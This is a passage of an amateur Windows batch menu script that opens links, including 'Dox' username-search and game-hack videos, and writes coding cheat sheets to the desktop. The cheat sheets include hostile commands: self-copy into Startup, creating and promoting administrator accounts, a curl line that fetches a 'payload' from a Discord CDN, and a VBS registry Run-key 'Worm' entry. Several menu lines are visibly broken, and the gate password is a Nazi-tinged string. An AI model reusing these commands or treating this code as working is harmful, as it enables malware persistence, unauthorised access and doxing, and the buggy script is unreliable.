if %Website% == 37 start https://www.reddit.com/
if %Website% == 38 start https://discord.gg/XdvwE6pM
if %Website% == 39 start https://discord.gg/YT4GxBVP
if %Website% == 40 start https://anydesk.com/de?utm_term=anydesk&utm_campaign=Germany+-+Search+-+Lower+Funnel+-+Brand&utm_source=adwords&utm_medium=ppc&hsa_acc=3993259132&hsa_cam=1756998641&hsa_grp=69865131518&hsa_ad=567801914087&hsa_src=g&hsa_tgt=kwd-303074541300&hsa_kw=anydesk&hsa_mt=e&hsa_net=adwords&hsa_ver=3
if %Website% == 41 start https://www.photopea.com/
if %Website% == 42 start https://trashga.ng/
if %Website% == 43 start https://trashga.ng/discord/
if %Website% == 44 start https://www.torproject.org/de/download/
if %Website% == 45 start https://apps.microsoft.com/home?hl=de-DE&gl=DE
if %Website% == 46 goto MainMenu
goto Website

:AIassistent
cls
title Choose your AI Assistent %username%
echo 1) Chat GPT
echo 2) Google AI
echo 3) close
echo.
set /p AIassistent=choose: 
if %AIassistent% == 1 start https://chatgpt.com/
if %AIassistent% == 2 goto https://gemini.google.com/
if %AIassistent5 == 3 goto MainMenu
goto AIassistent

:Credits
cls
md Infos
cd %userprofile%\Desktop\Infos
msg * Hallo %username% du hast nun eine Credit Datei MFG Marv492005 :^>
echo Hallo Liebe User >Credits.txt
echo Hier ist der Creator diese BAT >>Credits.txt
echo Diese Datei ist hier falls du die Credits nicht öffnen kannst >>Credits.txt
echo Mein Name ist Marv492005 ich bin der Creator ich bin vom TeamSilencium >>Credits.txt
echo Mein Helfer ist Baum er hat mir die Idee gegeben Batch zu lernen >>Credits.txt
echo Von Baum stammt diese ganzen Dox Optionen PS: man kann sehr Viel Spaß mit haben >>Credits.txt
echo Eigentlich war diese BAT nur ein Test aber daraus wurde ein Menü >>Credits.txt
echo Ich werde aber immer noch weiter an dem Projekt arbeiten und bald wird noch viel mehr kommen >>Credits.txt
echo Falls du Probleme hast oder Fragen hast den adde mich doch einfach auf Discord >>Credits.txt
echo Falls es Probleme mit dem Dox Tool ist bitte Meldet euch bei Baum >>Credits.txt
echo Discord Name: Marv492005#8419 >>Credits.txt
echo Discord Name Baum: baum#2873 >>Credits.txt
echo My Discord Server: https://discord.gg/XdvwE6pM >>Credits.txt
echo TeamSilencium Discord Server: https://discord.gg/YT4GxBVP >>Credits.txt
echo Viel Spaß mit diesem Menü >>Credits.txt
start Credits.txt
goto MainMenu

:Programms
cls
title Welcome to the Programm Menu
echo 1) Brave
echo 2) Chrome
echo 3) Explorer
echo 4) Editor
echo 5) Notepad++
echo 6) Paint
echo 7) Close
echo.
echo.
echo                                                                                                     [Made By Marv492005]
set /p Programme=choose: 
if %Programme% == 1 start brave.exe
if %Programme% == 2 start chrome.exe
if %Programme% == 3 start iexplore.exe
if %Programme% == 4 start notepad.exe
if %Programme% == 5 start notepad++.exe
if %Programme% == 6 start mspaint.exe
if %Programme% == 7 goto MainMenu
goto Programme

:Videos
cls
title Welcome to the TeamSilencium Videos %username%
echo 1) (Script, Hack) Cooking Simulator
echo 2) (Script, Hack) Fortress Tycoon
echo 3) (Script, Hack) Kitty
echo 4) (Script, Hack) Skyblock
echo 5) (Script, Hack) Streets of Bloxwood
echo 6) Close
echo.
echo.
set /p Videos=choose: 
if %Videos% == 1 start https://youtu.be/49nLUaMVxUE
if %Videos% == 2 start https://youtu.be/aWQbaDO5Yno
if %Videos% == 3 start https://youtu.be/WFzP_jGNUQE
if %Videos% == 4 start https://youtu.be/7ISf6iH7N3c
if %Videos% == 5 start https://youtu.be/EW69d2xvB3w
if %Videos% == 6 goto MainMenu
goto Videos

:RobuxCodes
cls
title Welcome to the RobuxCodes %username%
echo 1) Robux Codes Video
echo 2) Close
echo.
echo.
set /p RobuxCodes=choose: 
if %RobuxCodes% == 1 start https://youtu.be/dQw4w9WgXcQ
if %RobuxCodes% == 2 goto MainMenu
goto RobuxCodes

:Info
cls
title Willkommen in der Info %username%
echo Wir versuchen gerade an etwas zu arbeiten was dieses Menu etwas besser gestaltet
echo 1) Close
set /p Info=choose: 
if %Info% == 1 goto MainMenu
goto Info

:Password3
cls
title Enter The password here
echo set speechobject=createobject("sapi.spvoice") >%userprofile%\AppData\Local\Temp\welcome.vbs
echo dim speechobject >>%userprofile%\AppData\Local\Temp\welcome.vbs
echo speechobject.speak "Please enter the Password %username%" >>%userprofile%\AppData\Local\Temp\welcome.vbs
timeout 1 >NUL
start %userprofile%\AppData\Local\Temp\welcome.vbs
timeout 1 >NUL
del %userprofile%\AppData\Local\Temp\welcome.vbs
set /p Password2=Passwort: 
if %Password2% == HeilManfred goto UsernameInfo
echo wrong
pause
goto Password3

:UsernameInfo
cls
title Here you can see where someone is registered.
echo 1) Username Search
echo 2) close
echo.
echo.
set /p UsernameInfo=choose: 
if %UsernameInfo% == 1 start https://whatsmyname.app/
if %UsernameInfo% == 2 goto MainMenu
goto UsernameInfo

:ProgrammingLanguage
cls
title Choose your programming language
md ProgrammingLanguage
echo 1) Batch
echo 2) VBS
echo 3) Python
echo 4) HTML
echo 5) C-Sharp
echo.
echo.
echo 6) close
set /p ProgrammingLanguage=choose: 
if %ProgrammingLanguage% == 1 goto Batch
if %ProgrammingLanguage% == 2 goto VBS
if %ProgrammingLanguage% == 3 goto Python
if %ProgrammingLanguage% == 4 goto HTML
if %ProgrammingLanguage% == 5 goto CSharp
if %ProgrammingLanguage% == 6 goto MainMenu
goto ProgrammingLanguage

:Batch
cls
cd C:\Users\%Username%\Desktop\ProgrammingLanguage
echo Befehl	       			  Funktion >ProgrammingBatch.txt
echo shutdown -s			shutdowns the pc >>ProgrammingBatch.txt
echo --------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo shutdown -r			restarts the pc >>ProgrammingBatch.txt
echo ------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo shutdown -l			logout >>ProgrammingBatch.txt
echo ----------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo shutdown -a			stopps the shutdown	 >>ProgrammingBatch.txt
echo ------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo - t xx				time bevore the shutdown happens >>ProgrammingBatch.txt
echo ---------------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo - f	               		closes everything without warning >>ProgrammingBatch.txt
echo ------------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo shutdown -s -t 1800 -f 		shutdowns the pc after 1800 seconds and closes all windows >>ProgrammingBatch.txt
echo ------------------------------------------------------------------------------------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo timeout 100    			wait bevore executes the code under it >>ProgrammingBatch.txt
echo >>ProgrammingBatch.txt
echo ------------------------------------------------------------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo cls 				clears the cmd text >>ProgrammingBatch.txt
echo ------------------------------------------------------------------------------------------------------------------------------------------------ >>ProgrammingBatch.txt
echo set /p hello=			options per text >>ProgrammingBatch.txt
echo if %hello%==yes goto yes >>ProgrammingBatch.txt
echo if %hello%==no goto no >>ProgrammingBatch.txt
echo :yes >>ProgrammingBatch.txt
echo :no >>ProgrammingBatch.txt
echo -------------------------------------------------------------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo ipconfig/all			shows ip informations  >>ProgrammingBatch.txt
echo ------------------------------------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo ping url 			shows the ip from the webside  >>ProgrammingBatch.txt
echo --------------------------------------------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo @mode con cols=35 lines=7 	changes the size of the cmd >>ProgrammingBatch.txt
echo --------------------------------------------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo title  				changes the title of the cmd >>ProgrammingBatch.txt
echo -------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo cd C:\Users\%username%\Desktop\der ordner\       goes to the path >>ProgrammingBatch.txt
echo --------------------------------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo copy "%0" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"     copys the file in startup >>ProgrammingBatch.txt
echo ------------------------------------------------------------------------------------------------------------------------ >>ProgrammingBatch.txt
echo > NUL    			makes commands invisible >>ProgrammingBatch.txt
echo --------------------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo text > test.txt 		speichert den davorstehenden text in einer .txt oder erstetzt ihn wenn bereits die datei vorhanden ist >>ProgrammingBatch.txt
echo --------------------------------------------------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo das was drin steht >> Text.txt  speichert den davorstehenden text in einer .txt oder fügt ihn zu einer bereits vorhandenen datei hinzu >>ProgrammingBatch.txt
echo -------------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo :start								password system >>ProgrammingBatch.txt
echo cls >>ProgrammingBatch.txt
echo echo Gebe bitte das Passwort ein. >>ProgrammingBatch.txt
echo set /P passwort="Passwort: " >>ProgrammingBatch.txt
echo if "%passwort%"=="baum1810" goto richtig >>ProgrammingBatch.txt
echo cls >>ProgrammingBatch.txt
echo echo Passwort falsch! >>ProgrammingBatch.txt
echo ping /n 3 localhost >NUL >>ProgrammingBatch.txt
echo goto start >>ProgrammingBatch.txt
echo :richtig >>ProgrammingBatch.txt
echo goto admin pannel >>ProgrammingBatch.txt
echo exit >>ProgrammingBatch.txt
echo ----------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo cmd <text.txt			executes the commands from a txt >>ProgrammingBatch.txt
echo ----------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo %%%				print % >>ProgrammingBatch.txt
echo ---------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo ^ 				lässt vieles printen (muss vor dem zeichen oder zahl stehen die ohne nicht geprintet wird) >>ProgrammingBatch.txt
echo ------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo %username%			gets the local username >>ProgrammingBatch.txt
echo ------------------------------------------------------------------------------------ >>ProgrammingBatch.txt
echo if exist file.txt 		sucht ob die file.txt in dem ordern/ pfad vorhanden ist >>ProgrammingBatch.txt
echo ---------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo goto 				goes to a variable >>ProgrammingBatch.txt
echo --------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo taskkill /im explorer.exe /f 	kills a running programm >>ProgrammingBatch.txt
echo -------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo @echo off			schaltet die textliche ausgabe jedes befehles aus >>ProgrammingBatch.txt
echo ------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo md ordername			creates a folder >>ProgrammingBatch.txt
echo ----------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo start notepad.exe		starts a programm or webside >>ProgrammingBatch.txt
echo ----------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo Date 1.1.1999			changes the date >>ProgrammingBatch.txt
echo ----------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo Time 12:00:52,08		changes the time >>ProgrammingBatch.txt
echo ----------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo RUNDLL32 USER32.DLL,SwapMouseButton	swap mouse buttons >>ProgrammingBatch.txt
echo ------------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo del /s /q "C:\Users\%username%\AppData\Local\Temp" delets the file or folder >>ProgrammingBatch.txt
echo ------------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo copy "C:\Users\%username%\Desktop\try.txt" "C:\Users\%username%\Downloads\tryy.txt"		copys the file in the folder (with the name) >>ProgrammingBatch.txt
echo -------------------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo ren cd C:\Users\%username%\Desktop try.txt test.txt		renames the file >>ProgrammingBatch.txt
echo ---------------------------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo PING 1.1.1.1 -n 1 -w 0.6 >NUL	 	timeout version with milliseconds >>ProgrammingBatch.txt
echo ----------------------------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo %random%			generates a random number >>ProgrammingBatch.txt
echo ---------------------------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo color				changes the color of the text/cmd >>ProgrammingBatch.txt
echo --------------------------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo tree				zeigt den stamm baum aller ordner an >>ProgrammingBatch.txt
echo ------------------------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo msg * message			opens a message box >>ProgrammingBatch.txt
echo ---------------------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo pause				pauses the cmd >>ProgrammingBatch.txt
echo ---------------------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo net user			shows all users >>ProgrammingBatch.txt
echo --------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo net user username * 		changes the password of the account >>ProgrammingBatch.txt
echo -------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo net localgroup			shows all local groups >>ProgrammingBatch.txt
echo ------------------------------------------------------------------------------------ >>ProgrammingBatch.txt
echo net user name passwort /add	adds a new account >>ProgrammingBatch.txt
echo -------------------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo net localgroup Administratoren name /add 	gib den angegebenen accound administrator rechte >>ProgrammingBatch.txt
echo ---------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo ipconfig /release 		gibt alle verbindungen frei (man hat kein internet) >>ProgrammingBatch.txt
echo --------------------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo ipconfig /renew 		renew all adapter >>ProgrammingBatch.txt
echo -------------------------------------------------------------------- >>ProgrammingBatch.txt
echo CMD 				starts a command promt >>ProgrammingBatch.txt
echo --------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo EXIT				Exits the programm >>ProgrammingBatch.txt
echo ------------------------------------------------------------------ >>ProgrammingBatch.txt
echo SYSTEMINFO			shows informations about the pc >>ProgrammingBatch.txt
echo --------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo net user administrator /active:yes activates the administrator account >>ProgrammingBatch.txt
echo --------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo net user (net username) /active:yes activate/dectivate the account mit /yes oder /no >>ProgrammingBatch.txt
echo --------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo @echo off >>ProgrammingBatch.txt
echo set isadmin=0								--check if someone execute it with admin or without >>ProgrammingBatch.txt
echo whoami /all | findstr /c:" S-1-16-12288 ">nul && set isadmin=1 >>ProgrammingBatch.txt
echo IF %isadmin% EQU 1 ( >>ProgrammingBatch.txt
echo 	goto ask >>ProgrammingBatch.txt
echo ) ELSE ( >>ProgrammingBatch.txt
echo 	ECHO Error: Please run this file as Administrator >>ProgrammingBatch.txt
echo 	@pause >>ProgrammingBatch.txt
echo 	exit >>ProgrammingBatch.txt
echo ) >>ProgrammingBatch.txt
echo --------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo findstr /m "word" test.txt 								       --looks if the word is in the txt >>ProgrammingBatch.txt
echo if %errorlevel%==0 ( >>ProgrammingBatch.txt
echo >>ProgrammingBatch.txt
echo word is in the list >>ProgrammingBatch.txt
echo pause >>ProgrammingBatch.txt
echo >>ProgrammingBatch.txt
echo ) >>ProgrammingBatch.txt
echo >>ProgrammingBatch.txt
echo echo word is not in the list >>ProgrammingBatch.txt
echo >>ProgrammingBatch.txt
echo ---------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo curl https://cdn.discordapp.com/attachments/766391552816971807/828752831258689616/test.bat   --downloads and starts the file from the discord link (payload) >>ProgrammingBatch.txt
echo ---------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo set /a awnser=1+1 >>ProgrammingBatch.txt
echo echo %awnser%										     --calculates the given numbers >>ProgrammingBatch.txt
echo ---------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo ATTRIB +H note.txt									     --hides the file (not works if u can see hided files) ((+ adds is - deletes it)) >>ProgrammingBatch.txt
echo ---------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo FC D:\a.txt D:\b.txt									     --compares 2 files and shows the difrent >>ProgrammingBatch.txt
echo ---------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo MORE D:\example.txt									     --shows the content of a file line by line >>ProgrammingBatch.txt
echo ---------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo SORT D:\example.txt									     --shorts the file alphabetically >>ProgrammingBatch.txt
echo ---------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo REM note										     --code after REM didnt get executet >>ProgrammingBatch.txt
echo ---------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo SETLOCAL >>ProgrammingBatch.txt
echo the code u want										     --can be used to use the same variable name multible times >>ProgrammingBatch.txt
echo ENDLOCAL >>ProgrammingBatch.txt
echo ---------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo FOR /F  %%text IN (abc.txt) DO echo hi							     --executes the code for every text in the txt >>ProgrammingBatch.txt
echo ---------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo echo.											     --creates a empty line >>ProgrammingBatch.txt
echo ---------------------------------------------------------------------------------- >>ProgrammingBatch.txt
echo whoami /all										     --Display user, group and privileges for the current user. >>ProgrammingBatch.txt
echo ----------------------------------------------------------------------------------							 >>ProgrammingBatch.txt
timeout 1 >NUL
goto ProgrammingLanguage

:VBS
cls
echo X=MsgBox("hello your pc have a virus",0+16,"hacker")		--Error message box >VBSProgramming.txt
echo ---------------------------------------------------------------------------- >>VBSProgramming.txt
echo WScript.Echo("Hello")						--Message box >>VBSProgramming.txt
echo ---------------------------------------------------------------------------- >>VBSProgramming.txt
echo WshShell.SendKeys "Hello world"					--sends keys >>VBSProgramming.txt
echo WshShell.SendKeys "{ENTER}" >>VBSProgramming.txt
echo ---------------------------------------------------------------------------- >>VBSProgramming.txt
echo Set WshShell = WScript.CreateObject("WScript.Shell")		--needed bevore anything with WshShell >>VBSProgramming.txt
echo ---------------------------------------------------------------------------- >>VBSProgramming.txt
echo WScript.Sleep 500 						--waits bevore the script continues (milliseconds) >>VBSProgramming.txt
echo ---------------------------------------------------------------------------- >>VBSProgramming.txt
echo WshShell.Run "notepad.exe"					--starts a programm >>VBSProgramming.txt
echo ---------------------------------------------------------------------------- >>VBSProgramming.txt
echo Set ws = CreateObject("WScript.Shell") >>VBSProgramming.txt
echo ws.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Worm", "wscript.exe c:\windows\file.bat %" 	--regedit startup >>VBSProgramming.txt
timeout 2 >NUL
goto ProgrammingLanguage

:Python
cls
title Python Programming
echo 1) Python 1
echo 2) Python 2
echo 3) Python 3
echo. 
echo.
echo 4) close
set /p Python=choose:
if %Python% == 1 goto Python1
if %Python% == 2 goto Python2
if %Python% == 3 goto Python3
if %Python% == 4 goto ProgrammingLanguage
goto Python

:Python1
cls
echo #allow/ disallow notifications >Python1.txt
echo -------------------------------------------------------------------------------------------------------- >>Python1.txt
echo from selenium import webdriver >>Python1.txt
echo from selenium.webdriver.chrome.options import Options >>Python1.txt
echo -------------------------------------------------------------------------------------------------------- >>Python1.txt
echo option = Options() >>Python1.txt
echo -------------------------------------------------------------------------------------------------------- >>Python1.txt
echo option.add_argument("--disable-infobars") >>Python1.txt
echo option.add_argument("start-maximized") >>Python1.txt
echo option.add_argument("--disable-extensions") >>Python1.txt
echo -------------------------------------------------------------------------------------------------------- >>Python1.txt
echo # Pass the argument 1 to allow and 2 to block >>Python1.txt
echo option.add_experimental_option("prefs", {  >>Python1.txt
echo     "profile.default_content_setting_values.notifications": 1  >>Python1.txt
echo }) >>Python1.txt
echo -------------------------------------------------------------------------------------------------------- >>Python1.txt
echo driver = webdriver.Chrome(chrome_options=option, executable_path='chromedriver.exe') >>Python1.txt
echo driver.get('url') >>Python1.txt
echo ------------------------------------------------------------------------------------------------------- >>Python1.txt
echo #starts the browser maxi/minimized >>Python1.txt
echo options.add_argument("start-maximized") >>Python1.txt
echo options.add_argument("start-minimized") >>Python1.txt
echo ------------------------------------------------------------------------------------------------------- >>Python1.txt
echo #finds the element by the xpath >>Python1.txt
echo test = driver.find_element_by_xpath('the xpath') >>Python1.txt
echo ------------------------------------------------------------------------------------------------------- >>Python1.txt
echo #sends the keys >>Python1.txt
echo test.send_keys("text") >>Python1.txt
echo ------------------------------------------------------------------------------------------------------- >>Python1.txt
echo #clicks on the variable >>Python1.txt
echo test.click() >>Python1.txt
echo ------------------------------------------------------------------------------------------------------- >>Python1.txt
echo #headless Edge >>Python1.txt
echo options = EdgeOptions() >>Python1.txt
echo options.use_chromium = True >>Python1.txt
echo options.add_argument("headless") >>Python1.txt
echo options.add_argument("disable-gpu") >>Python1.txt
echo ------------------------------------------------------------------------------------------------------- >>Python1.txt
echo #makes a screenshot of the webside and saves the picture in the folder >>Python1.txt
echo driver.get_screenshot_as_file("name.png") >>Python1.txt
echo ------------------------------------------------------------------------------------------------------- >>Python1.txt
echo #driver opens the url >>Python1.txt
echo driver.get("https://youtube.com") >>Python1.txt
echo ------------------------------------------------------------------------------------------------------- >>Python1.txt
echo #activates/deactivates chrome settings >>Python1.txt
echo opt = Options() >>Python1.txt
echo opt.add_argument("--disable-infobars") >>Python1.txt
echo -------------------------------------------------------------------------------------------------------- >>Python1.txt
echo opt.add_argument("--disable-extensions") >>Python1.txt
echo # Pass the argument 1 to allow and 2 to block >>Python1.txt
echo opt.add_experimental_option("prefs", { \ >>Python1.txt
echo     "profile.default_content_setting_values.media_stream_mic": 1,  >>Python1.txt
echo     "profile.default_content_setting_values.media_stream_camera": 1, >>Python1.txt
echo     "profile.default_content_setting_values.geolocation": 2,  >>Python1.txt
echo     "profile.default_content_setting_values.notifications": 2  >>Python1.txt
echo   }) >>Python1.txt
echo driver = webdriver.Chrome(executable_path='chromedriver.exe', chrome_options=opt) >>Python1.txt
echo ------------------------------------------------------------------------------------------------------- >>Python1.txt
echo #mutes the browser >>Python1.txt
echo options.add_argument("--mute-audio") >>Python1.txt
echo ------------------------------------------------------------------------------------------------------- >>Python1.txt
echo #http proxys >>Python1.txt
echo options.add_argument('--proxy-server=%s' % PROXY) >>Python1.txt
echo ------------------------------------------------------------------------------------------------------- >>Python1.txt
echo #minimizes the driver >>Python1.txt
echo driver.minimize_window() >>Python1.txt
echo ------------------------------------------------------------------------------------------------------- >>Python1.txt
echo #prints the curent url >>Python1.txt
echo url = driver.current_url(); >>Python1.txt
echo print(url) >>Python1.txt
echo ------------------------------------------------------------------------------------------------------- >>Python1.txt
echo #refreshes the driver >>Python1.txt
echo driver.refresh() >>Python1.txt
echo ------------------------------------------------------------------------------------------------------- >>Python1.txt
echo #closes the driver >>Python1.txt
echo driver.Quit() >>Python1.txt
echo ------------------------------------------------------------------------------------------------------- >>Python1.txt
echo #addons >>Python1.txt
echo chrome_options.add_extension('path_to_extension') >>Python1.txt
timeout 1 >NUL
goto Python

:Python2
cls
echo import colorama >Python2.txt
echo from colorama import Fore, Back, Style >>Python2.txt
echo colorama.init(autoreset=True) >>Python2.txt
echo ------------------------------------------------------------------------------------------------------------- >>Python2.txt
echo print('\033[31m' + 'some red text') >>Python2.txt
echo print('\033[39m')  # and reset to default color >>Python2.txt
echo print() >>Python2.txt
echo print(f"{Fore.RED}C{Fore.GREEN}O{Fore.YELLOW}L{Fore.BLUE}O{Fore.MAGENTA}R{Fore.CYAN}S{Fore.WHITE}!") >>Python2.txt
echo print(f"{Fore.RED}Red Text") >>Python2.txt
echo print(f"{Fore.GREEN}Green Text") >>Python2.txt
echo print(f"{Fore.YELLOW}Yellow Text") >>Python2.txt
echo print(f"{Fore.BLUE}Blue Text") >>Python2.txt
echo print(f"{Fore.MAGENTA}Magenta Text") >>Python2.txt
echo print(f"{Fore.CYAN}Cyan Text") >>Python2.txt
echo print(f"{Fore.WHITE}White Text") >>Python2.txt
echo print() >>Python2.txt
echo print(f"{Back.RED}B{Back.GREEN}A{Back.YELLOW}C{Back.BLUE}K{Back.MAGENTA}G{Back.CYAN}R{Back.WHITE}O{Back.RED}U{Back.GREEN}N{Back.YELLOW}D{Back.BLUE}!") >>Python2.txt
echo print(f"{Back.RED}Red Background") >>Python2.txt
echo print(f"{Back.GREEN}Green Background") >>Python2.txt
echo print(f"{Back.YELLOW}Yellow Background") >>Python2.txt
echo print(f"{Back.BLUE}Blue Background") >>Python2.txt
echo print(f"{Back.MAGENTA}Magenta Background") >>Python2.txt
echo print(f"{Back.CYAN}Cyan Background") >>Python2.txt
echo print(f"{Back.WHITE}White Background") >>Python2.txt
echo print() >>Python2.txt
echo print(f"{Style.DIM}S{Style.NORMAL}T{Style.BRIGHT}Y{Style.DIM}L{Style.NORMAL}E{Style.BRIGHT}!") >>Python2.txt
echo print(f"{Style.DIM}Dim Text") >>Python2.txt
echo print(f"{Style.NORMAL}Normal Text") >>Python2.txt
echo print(f"{Style.BRIGHT}Bright Text") >>Python2.txt
echo print() >>Python2.txt
echo print(f"{Fore.YELLOW}{Back.RED}C{Back.GREEN}{Fore.RED}O{Back.YELLOW}{Fore.BLUE}M{Back.BLUE}{Fore.BLACK}B{Back.MAGENTA}{Fore.CYAN}I{Back.CYAN}{Fore.GREEN}N{Back.WHITE}A{Back.RED}T{Back.GREEN}I{Back.YELLOW}O{Back.BLUE}N") >>Python2.txt
echo print(f"{Fore.GREEN}{Back.YELLOW}{Style.BRIGHT}Green Text - Yellow Background - Bright") >>Python2.txt
echo print(f"{Fore.CYAN}{Back.WHITE}{Style.DIM}Cyan Text - White Background - Dim") >>Python2.txt
echo ------------------------------------------------------------------------------------------------------------------- >>Python2.txt
echo ''' >>Python2.txt
echo Fore: BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE, RESET. >>Python2.txt
echo Back: BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE, RESET. >>Python2.txt
echo Style: DIM, NORMAL, BRIGHT, RESET_ALL >>Python2.txt
echo ''' >>Python2.txt
timeout 1 >NUL
goto Python

:Python3
cls
echo from flask import Flask, render_template, redirect, send_file, make_response >Python3
echo app = Flask(__name__) >>Python3.txt
echo @app.route('/test/') #the path wich will be used in the url >>Python3.txt
echo ################################################################ >>Python3.txt
echo @app.route('/test/<string:name>/')  #arguments can be passed over the url >>Python3.txt
echo def gettoken(name): >>Python3.txt
echo ################################################################ >>Python3.txt
echo return redirect("https://google.com") #redirects the visitor to the givven webside >>Python3.txt
echo ################################################################ >>Python3.txt
echo return "test"    # returns the message on a blank page >>Python3.txt
echo ################################################################ >>Python3.txt
echo return send_file("test.txt") #displays the content of a file on the webside >>Python3.txt
echo ################################################################ >>Python3.txt
echo @app.errorhandler(404) >>Python3.txt
echo def page_not_found(e): #what should happen if a link dosnt exist >>Python3.txt
echo ################################################################ >>Python3.txt
echo app.run(debug=False,host='0.0.0.0', port=8000) #start the webside on the given host and port >>Python3.txt
echo ################################################################ >>Python3.txt
echo app = Flask(__name__, template_folder='template') #displayes the file on the webside >>Python3.txt
echo @app.route('/', methods = ['GET', 'POST']) >>Python3.txt
echo def Index(): >>Python3.txt
echo     return render_template('base.html') >>Python3.txt
echo ################################################################ >>Python3.txt
echo @app.route('/', methods = ['GET', 'POST']) #main link
echo def Index(): >>Python3.txt
echo ################################################################ >>Python3.txt
echo @app.route('/download_file') #downloadable file >>Python3.txt
echo def download_file(): >>Python3.txt
echo     path = "test.txt" >>Python3.txt
echo     return send_file(path,as_attachment=True) >>Python3.txt
echo ################################################################ >>Python3.txt
echo resp = make_response() >>Python3.txt
echo resp.set_cookie('somecookiename', 'I am cookie') #creates the cookie >>Python3.txt
echo cookie = request.cookies.get('somecookiename') #reads the cookie >>Python3.txt
timeout 1 >NUL
goto Python

:HTML
cls
echo <h1> Title from webside </h1>				--Title from websides >HTMLProgramming.txt
echo -------------------------------------------------------------- >>HTMLProgramming.txt
echo <head> ... </head>					-- >>HTMLProgramming.txt
echo -------------------------------------------------------------- >>HTMLProgramming.txt
echo <strong> … </strong>					--makes the text stronger >>HTMLProgramming.txt
echo -------------------------------------------------------------- >>HTMLProgramming.txt
echo <html> .. <html>					--one html at the start and one at the end >>HTMLProgramming.txt
echo -------------------------------------------------------------- >>HTMLProgramming.txt
echo <button> ... </button>					--creates a button >>HTMLProgramming.txt
echo -------------------------------------------------------------- >>HTMLProgramming.txt
echo <body style="background-image:url(background.jpg)"> 	--sets a backround >>HTMLProgramming.txt
timeout 1 >NUL
goto ProgrammingLanguage

:Goodbye
cls
title Bis bald %username%
Color A
echo       ::::::::  :::        ::::::::   :::::::: ::::::::::: ::::    :::  ::::::::             
echo     :+:    :+: :+:       :+:    :+: :+:    :+:    :+:     :+:+:   :+: :+:    :+:             
echo    +:+        +:+       +:+    +:+ +:+           +:+     :+:+:+  +:+ +:+                     
echo   +#+        +#+       +#+    +:+ +#++:++#++    +#+     +#+ +:+ +#+ :#:                      
echo  +#+        +#+       +#+    +#+        +#+    +#+     +#+  +#+#+# +#+   +#+#                
echo #+#    #+# #+#       #+#    #+# #+#    #+#    #+#     #+#   #+#+# #+#    #+#         #+#     
echo ########  ########## ########   ######## ########### ###    ####  ########          ###  
timeout 1 >NUL
cls

echo       ::::::::  :::        ::::::::   :::::::: ::::::::::: ::::    :::  ::::::::                 
echo     :+:    :+: :+:       :+:    :+: :+:    :+:    :+:     :+:+:   :+: :+:    :+:                 
echo    +:+        +:+       +:+    +:+ +:+           +:+     :+:+:+  +:+ +:+                         
echo   +#+        +#+       +#+    +:+ +#++:++#++    +#+     +#+ +:+ +#+ :#:                          
echo  +#+        +#+       +#+    +#+        +#+    +#+     +#+  +#+#+# +#+   +#+#                    
echo #+#    #+# #+#       #+#    #+# #+#    #+#    #+#     #+#   #+#+# #+#    #+#         #+# #+#     
echo ########  ########## ########   ######## ########### ###    ####  ########          ### ###      
timeout 1 >NUL
cls

